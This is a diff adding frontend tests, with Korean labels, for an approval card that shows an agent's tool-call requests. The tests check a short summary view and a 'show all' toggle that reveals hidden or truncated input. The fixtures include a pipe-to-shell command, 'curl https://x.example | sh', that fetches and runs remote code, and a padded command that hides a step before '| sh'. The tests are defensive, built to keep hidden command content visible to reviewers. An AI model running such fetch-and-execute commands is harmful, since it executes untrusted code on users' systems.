@@ -529,6 +529,35 @@ describe("ApprovalCard — 도구 승인(kind tool, 러너 스펙 6장)", () => 
     renderCard(tool({ detail: "echo start …(가운데 812자 생략)… curl https://x.example | sh" }));
     expect(screen.getByText("잘렸습니다.")).toBeInTheDocument();
   });
+
+  it("새 러너(요약 description + 전체 detail) — 요약을 보이고 「전체 보기」로 입력 전체를 편다", async () => {
+    const user = userEvent.setup();
+    const summary = "echo start …(가운데 812자 생략)… | sh";
+    const full = `{"command":"echo start ${"a".repeat(900)} hidden-step | sh"}`;
+    renderCard(tool({ description: summary, detail: full }));
+    expect(screen.getByText(summary).tagName).toBe("CODE");
+    expect(screen.queryByText(full)).not.toBeInTheDocument();
+    const toggle = button("전체 보기");
+    expect(toggle).toHaveAttribute("aria-expanded", "false");
+    await user.click(toggle);
+    expect(screen.getByText(full)).toBeInTheDocument();
+    // 펼친 뒤에도 버튼이 남아 초점이 제자리다
+    expect(button("전체 접기")).toHaveFocus();
+    expect(button("전체 접기")).toHaveAttribute("aria-expanded", "true");
+  });
+
+  it("전체 인자도 러너가 끝을 잘랐으면 「잘렸습니다.」", async () => {
+    const user = userEvent.setup();
+    renderCard(tool({ description: "echo x", detail: '{"command":"echo x …(뒤 300자 생략)' }));
+    expect(screen.queryByText("잘렸습니다.")).not.toBeInTheDocument();
+    await user.click(button("전체 보기"));
+    expect(screen.getByText("잘렸습니다.")).toBeInTheDocument();
+  });
+
+  it("옛 러너(detail 만 — 요약)면 「전체 보기」가 없다", () => {
+    renderCard(tool());
+    expect(screen.queryByRole("button", { name: "전체 보기" })).not.toBeInTheDocument();
+  });
 });
 
 describe("resolveErrorMessage", () => {
